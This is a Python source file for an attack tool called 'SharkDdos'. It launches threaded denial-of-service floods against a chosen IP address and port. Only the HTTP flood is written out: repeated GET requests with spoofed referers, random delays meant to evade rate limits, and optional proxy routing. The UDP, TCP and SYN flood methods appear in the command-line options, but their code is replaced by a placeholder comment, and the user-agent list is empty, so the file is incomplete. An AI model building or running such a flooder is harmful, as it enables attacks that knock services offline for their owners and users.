import socket
import threading
import time
import random
import argparse
import requests

class SharkDdos:
    def __init__(self, target, port, duration, threads, udp, tcp, http, syn, proxy):
        self.target = target
        self.port = port
        self.duration = duration
        self.threads = threads
        self.udp = udp
        self.tcp = tcp
        self.http = http
        self.syn = syn
        self.proxy = proxy

        # User agents and referers for HTTP requests
        self.useragents = [
            # List of user agents
        ]
        self.referers = [
            'http://www.google.com/?q=',
            'http://www.usatoday.com/search/results?q=',
            'http://engadget.search.aol.com/search?q=',
            'http://' + self.target + '/'
        ]

        # Proxy support
        self.proxies = {
            'http': self.proxy,
            'https': self.proxy
        } if self.proxy else None

    def send_http_request(self, session):
        headers = {
            'User-Agent': random.choice(self.useragents),
            'Referer': random.choice(self.referers)
        }
        try:
            response = session.get(f'http://{self.target}', headers=headers, proxies=self.proxies)
        except requests.exceptions.RequestException:
            pass

    def http_flood(self):
        session = requests.Session()
        start_time = time.time()
        while True:
            self.send_http_request(session)
            time.sleep(random.uniform(0.1, 0.5))  # Random delay to avoid rate limits
            if time.time() - start_time > self.duration:
                break

    # Other methods (udp_flood, tcp_flood, syn_flood) remain unchanged

    def start_attack(self):
        threads = []
        if self.udp:
            for _ in range(self.threads):
                t = threading.Thread(target=self.udp_flood)
                t.start()
                threads.append(t)

        if self.tcp:
            for _ in range(self.threads):
                t = threading.Thread(target=self.tcp_flood)
                t.start()
                threads.append(t)

        if self.http:
            for _ in range(self.threads):
                t = threading.Thread(target=self.http_flood)
                t.start()
                threads.append(t)

        if self.syn:
            for _ in range(self.threads):
                t = threading.Thread(target=self.syn_flood)
                t.start()
                threads.append(t)

        for t in threads:
            t.join()

def biting_animation():
    animation = "|/-\\"
    for _ in range(10):  # Show animation for 10 cycles
        for char in animation:
            print(f"\rBiting... {char}", end="")
            time.sleep(0.1)
    print("\r Starting the attack...")

def main():
    banner = """
               ░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░▓▒░░░░░░░░░░░░░░░░░
░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░▒▒▒░░░░░░░░░░░░░░░░░
░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░▒▒█░░░░░░░░░░░░░░░░░
░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░▒▒▓▒░░░░░░░░░░░░░░░░
░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░▒▒▓▒░░░░░░░░░░░░░░░░
░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░▒▒▓▓░░░░░░░░░░░░░░░░
░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░▒▒▓▓▒░░░░░░░░░░░░░░░
░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░▒▓▓▓░░░░░░░░░░░░░░░
░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░▓▒▓▓▒░░░░░░░░░░░░░░
░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░▒▒▓▓▓▒░░░░░░░░░░░░░
░░░░░░░░░░░▒▒▒░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░▒▒▒▒▒▒▒▒▒░░░░░░░░░░░░░▒▒▓▓▓▓░░░░░░░░░░░░░
░░░░░░░░░▒▓▓▓▒▓▓▒▒░░░░░░░░░░░░░░░░░░░░░░░░░░░▒▒▒▒▒▒▓▓▓▓▓▒░░░░░░░░░░░░░░░▓▒▓▓▓▒░░░░░░░░░░░░
░░░░░░░▒▓▓▓▓▓▓▓▓▓▒▒▓▒▒▒▒░░░░░░░░░░░░░░░░░░▒▒▒▒▒▓▓▓▓▓▓▓▓▒░░░░░░░░░░░░░░░░▓▒▓▓▓▓▒░░░░░░░░░░░
░░░░░▒▒▒▓▓▓▓▓▓▓▓▓▓▒▓▒▓▒▓▓▒░▒▒▒▒▒░░░░░░░░▒▒▒▒▓▓▓▓▓▓▓▓▓▓░░░░░░░░░░░░░░░░░░░▓▓▓▓▓▓▒░░░░░░░░░░
░░░░░▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▒▒▓█▓▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓▓▓▓▓▓▓▓▓▓▓░░░░░░░░░░░░░░░░░░░░▓▓▓▓▓▓▓▒░░░░░░░░░
░░░░░▒▒▒▒▒▓▓▓▓▓▓▓▓▓▓▒▒▒▒▓▓▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓▓▓▓▓▓▓▓▓▒▒▓░░░░░░░░░░░░░░░▒▒░░░▒▒▓▓▓▓▓▓▓▓▓▒▒░░░░
░░░░░▒▒▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▒▒▒▒▓▒▒▓▒▒▒▒▒▒▒▒▒▓▓▓▓▓▓▓▓▓▓▓▓▓░░░░░░░░░░░░░░░░▒▓▓▒▒▓▒▓▓▓▓▓▓▓▓▓▓▓▓▓▓▒
░░░░▒▓▓▓▒▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▒▒▒▒▒▓▒▒▓▒▓▓▒▒▒▒▒▒▒▓▓▓▓▓▓▓▓░░░░░░░░░░░░░░░▒▒▓▓▓▓▒▒▒▓▓▓▓▓▓▓▓▓▓▓▒░░
░░░▒▓▒▓███████████████▓▒▓▓▒▒▓▓▓▓▓▓▓▓▓▓▒▒▒▒▒▒▒▒▒▒▒▓▓░░░░░░░░░░░░░░░▒▒▒▓▒▒▒▒▓▓▓▓▒░░░░░░░░░░░
░░░░▓▓█████████████████▓▒▓▓▒▓▓▓▓▓▒▓▓▓▓▓▒▓▓▓▒▒▒▒▒▒▒▒▓▒▒░░░░░░░░░▒▒▒▒▒▒▒▒▒▓▓▓▓▓░░░░░░░░░░░░░
░░░░▒▓██████████████████▒▓▓▒▓▓▓▓▓▓▓▓▒▓▓▒▒▒▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓▓▓▓▓▓▓▒░░░░░░░░░░░░░
░░░░░▓██████████████████▓▓▓▒▒▓▓▓▓▓▓▓▓█▓▓▒▒▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓▓▓▓▓▓▓▓▓▒░░░░░░░░░░░░░░
░░░░░▓████████████████████▓▒▒▓▓▓▓▓▓▓█▓▓▒▓▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓▓▓▓▓▓▓▓▓▓▒░░░░░░░░░░░░░░░
░░░░▒▒▓▓█████████████████▓▒▒▒▒▓▓▓▓▓▓█▓▓▓▓▓▓▓▓▓▒▒▒▒▒▓▓▒▒▒▒▒▒▓▓▓▓▓▓▓▓▓▓▓▓▓▓░░░░░░░░░░░░░░░░░
░░░░▓▒▒▓█████████████████▓▓▒▒▒▒▓▓▓██▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▒░░░░░░░░░░░░░░░░░░
░░░▒▒▒▓▓███████████████▓▒▒▒▒▒▒▓█▓██▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▒░░▒░░░░░░░░░░░░░░░░
░░░▓▒▒▓▓███████████████▒▓▒▒▒▒▓████▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓██▓▓▓▓▓▓▓▓▒▒▒▒▒▒▒░░░░░░░░░░░░░░░░
░░░▓▒▒▒▒▓██▓█▓▓▓▓██▓█▓▓▒▒▒▒▒▓▓▓▓▓▓▓▓▓▒▒▓▒▒▓▓▓▓▓▓▓▓▓▓▓▓▓▓█▓▓▓▓▓▓▓▓▒▒▒▒▓▓▓▒░░░░░░░░░░░░░░░░░
░░░▒▓▒▒▒▒▓▓▓▓▓▓▒▓▓█▓▓▒▒▒▒▒▒█▓▓▒▒▒▓▓▓▓▓▒▒▒▒▒▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▒▒░░░░░░░░░░░░░░░░░░░░
░░░░▒▓▒▒▒▒▒▒▒▒▒▒▒▓▒▒▒▒▒▒▒▒▓▓▓▒▒▒▓▓▓▓▓▓▓▒▒▒▒▒▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▒▓▒░░░░░░░░░░░░░░░░░░░░░░░░░
░░░░▒▒▓▓▓▒▒▒░▒▒░▒▒▒▒▒▒▒▓▓▒░░░▒▒▒▓▓▒▓▓▓▓▓▓▒▒▒▒▓▓▓▓▓▓▓▓▓▓▓▓▓▒▒▓▒▒░░░░░░░░░░░░░░░░░░░░░░░░░░░
░░░▒▒▓▓▓▓▓▓▒▒▒▒▒▒▒▒▓▒▒▒░░░░░░░░░░░▒▒▒▓▓▓▓▓▓▒▒▒▒▓▓▓▓▓▓▓▒▒▒▒▒░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░
░░▒▒▓▓▓▓▒░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░▒▓▓▓▓▓▒▒▒▒▒░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░
░▒▒▓▓▓▓░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░▒▓▓▓▓▓▒▒▒▒░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░
░▒▓▓▓▒░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░▒▓▓▓▓▓▒▒▒▒▒░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░
▒▒▓▓▒░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░▒▒▒▒▓▓▒▒▒▓▒░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░
▒▓▓▒░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░
▓▓▓░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░
▒▒▒░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░

                                            
               SharkDdos DDoS  Tool
               Version 1.0(beta)
    """
    print(banner)

    parser = argparse.ArgumentParser(description='SharkDdos Simulation Tool')
    parser.add_argument('target', help='Target IP address')
    parser.add_argument('port', type=int, help='Target port')
    parser.add_argument('duration', type=int, help='Duration of the attack in seconds')
    parser.add_argument('--threads', type=int, default=100, help='Number of threads')
    parser.add_argument('--udp', action='store_true', help='Enable UDP flood')
    parser.add_argument('--tcp', action='store_true', help='Enable TCP flood')
    parser.add_argument('--http', action='store_true', help='Enable HTTP flood')
    parser.add_argument('--syn', action='store_true', help='Enable SYN flood')
    parser.add_argument('--proxy', type=str, help='Proxy server in the format ip:port')
    args = parser.parse_args()

    # Start biting animation
    biting_animation()

    ddos_tool = SharkDdos(args.target, args.port, args.duration, args.threads, args.udp, args.tcp, args.http, args.syn, args.proxy)
    ddos_tool.start_attack()

if __name__ == '__main__':
    main()
    